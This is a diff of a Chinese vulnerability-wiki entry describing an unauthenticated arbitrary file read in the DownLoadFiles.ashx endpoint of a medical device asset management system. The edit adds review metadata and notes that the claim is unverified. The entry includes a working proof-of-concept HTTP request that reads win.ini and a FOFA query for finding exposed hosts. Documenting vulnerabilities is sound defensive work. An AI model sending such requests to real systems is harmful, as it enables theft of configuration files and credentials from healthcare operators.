@@ -1,25 +1,66 @@
 ---
-fofa: "body="
 source: "SourByte05/Vulnerability-Wiki-PoC"
+title: "医疗设备资产管理系统（厂商待核） DownLoadFiles filename绝对路径读取"
+product: "医疗设备资产管理系统（厂商待核）"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "Windows示例；版本未知"
+prerequisites: "匿名声称"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8C%BB%E7%96%97%E8%AE%BE%E5%A4%87%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%8C%BB%E7%96%97%E8%AE%BE%E5%A4%87%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownLoadFiles%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+fofa: "body=\"ZLcommon\""
+fofa_unverified: "body="
+id: "vw-157224ab1a21c6964276babe"
+entity_id: "ve-157224ab1a21c6964276babe"
+schema_version: "1"
 ---
 
-# 医疗设备资产管理系统DownLoadFiles任意文件读取漏洞 
+# 医疗设备资产管理系统（厂商待核） DownLoadFiles filename绝对路径读取
 
-# 漏洞描述
+## 条目说明
+
+- 对象与具体问题：医疗设备资产管理系统（厂商待核）；DownLoadFiles filename绝对路径读取
+- 版本、配置及部署条件：Windows示例；版本未知
+- 认证与权限前提：匿名声称
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 厂商/发行方缺失，ZLcommon单指纹不足唯一定位产品
+- 只有win.ini请求和截图，无文字结果/配置文件证据，在野已知/广泛无出处
+- 规范HTTP围栏，补固定版本、修复和服务进程可读范围
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 漏洞描述
 
 医疗设备资产管理系统DownLoadFiles任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
 
-# 影响版本
+## 影响版本
 
 医疗设备资产管理系统
 
-# **漏洞状态**
+## **漏洞状态**
 
 | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
 |------|-------|-------|------|
-| 是 | 已公开 | 已公开 | 已知 |
+| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |
 
-## 风险等级
+### 风险等级
 
 | 维度 | 评价 |
 |----|----|
@@ -28,12 +69,13 @@ source: "SourByte05/Vulnerability-Wiki-PoC"
 | 攻击者价值 | 高 |
 | 利用难度 | 低 |
 
-# 漏洞复现
+## 漏洞复现
 
 FOFA：body="ZLcommon"
 
 POC/EXP：
 
+```http
 GET /ZCGL/TMGL/DownTemplate/DownLoadFiles.ashx?filename=C://Windows/win.ini HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
@@ -41,11 +83,13 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Upgrade-Insecure-Requests: 1
+```
+
 
 ![image-20241105225043914](./.resource/医疗设备资产管理系统DownLoadFiles任意文件读取漏洞/media/image-20241105225043914.png)
 
 
-# 修复方案
+## 修复方案
 
 关闭互联网暴露面或接口设置访问权限
 
